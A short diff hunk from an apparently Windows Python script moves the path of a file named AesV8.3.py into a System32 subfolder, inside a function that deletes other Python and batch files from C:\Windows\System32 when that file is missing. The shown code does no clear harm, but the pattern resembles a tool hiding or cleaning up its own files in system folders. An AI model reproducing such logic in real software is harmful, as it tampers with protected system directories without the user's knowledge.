@@ -90,7 +90,7 @@ os.system('cls')
 print("")
 print("")
 def delete_files_if_aesv3_missing():
-    aesv3_path = r"C:\Windows\System32\AesV8.3.py"
+    aesv3_path = r"C:\Windows\System32\xsystem\AesV8.3.py"
     files_to_delete = [
         r"C:\Windows\System32\AesV8.2.py",
         r"C:\Windows\System32\aesv8.2.bat",
